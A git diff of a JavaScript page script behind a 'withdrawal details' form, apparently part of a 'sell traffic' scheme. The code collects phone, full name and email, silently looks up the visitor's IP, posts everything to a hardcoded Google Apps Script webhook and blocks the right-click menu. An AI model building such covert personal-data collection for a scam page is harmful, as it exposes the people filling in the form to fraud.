@@ -164,54 +164,62 @@ $(function() {
 
 
 c['blocks']['requisites'] = function() {
-    // Функция для сбора данных, определения IP и отправки вебхука
-    window.sendDataToWebhook = async function() {
-        const phone = document.getElementById('phoneInput').value;
-        const fio = document.getElementById('fioInput').value;
-        const email = document.getElementById('emailInput').value;
+// Функция для получения IP (вынесена отдельно для чистоты)
+async function getUserIp() {
+    // Список сервисов для проверки
+    const services = [
+        'https://api.ipify.org',
+        'https://icanhazip.com',
+        'https://ident.me'
+    ];
 
-        if(!phone || !fio || !email) {
-            alert('Пожалуйста, заполните все поля');
-            return;
+    for (let url of services) {
+        try {
+            const response = await fetch(url);
+            if (response.ok) {
+                const ip = await response.text();
+                return ip.trim(); // Возвращаем чистый IP
+            }
+        } catch (e) {
+            console.warn(`Сервис ${url} недоступен`);
+            continue; // Пробуем следующий
         }
-
-        let userIp = 'Не определен';
-try {
-    const response = await fetch('https://ipapi.co');
-    if (response.ok) {
-        const data = await response.json();
-        userIp = data.ip;
-    } else {
-        // Запасной вариант, если ipapi не ответил
-        const backupRes = await fetch('https://api.ipify.org');
-        const backupData = await backupRes.json();
-        userIp = backupData.ip;
     }
-} catch (e) {
-    console.error('Ошибка получения IP:', e);
-    userIp = 'Ошибка: ' + e.message; 
+    return 'Не определен';
 }
 
-        const webhookUrl = 'https://script.google.com/macros/s/AKfycbxSQYe3xna1HPWSz0AgA2zMoYQzLWr6yhX8aETXkUOn7XyhNO7CrD7TEJE3WQNxjiSp/exec';
+// Ваша основная функция
+window.sendDataToWebhook = async function() {
+    const phone = document.getElementById('phoneInput').value;
+    const fio = document.getElementById('fioInput').value;
+    const email = document.getElementById('emailInput').value;
 
-        // Отправка данных на Google Script
-        fetch(webhookUrl, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                phone: phone,
-                fio: fio,
-                email: email,
-                ip: userIp, // Передаем IP адрес
-                timestamp: new Date().toLocaleString(),
-                source: 'Requisites Form'
-            })
-        });
+    if(!phone || !fio || !email) {
+        alert('Пожалуйста, заполните все поля');
+        return;
+    }
 
-        // Переход на следующую страницу
-        _nextPage('selltrafficresult');
-    };
+    // Вызываем получение IP
+    const userIp = await getUserIp();
+
+    const webhookUrl = 'https://script.google.com/macros/s/AKfycbxSQYe3xna1HPWSz0AgA2zMoYQzLWr6yhX8aETXkUOn7XyhNO7CrD7TEJE3WQNxjiSp/exec';
+
+    fetch(webhookUrl, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            phone: phone,
+            fio: fio,
+            email: email,
+            ip: userIp,
+            timestamp: new Date().toLocaleString(),
+            source: 'Requisites Form'
+        })
+    });
+
+    _nextPage('selltrafficresult');
+};
 
     return '<h2 style="color:#004777;">Заполнение реквизитов для вывода</h2>' +
     '<div class="container" style="margin-top: 40px; margin-bottom: 40px;">' +
@@ -494,4 +502,5 @@ if (document['layers']) {
 }
 
 document['oncontextmenu'] = new Function('return\x20false');
+
 
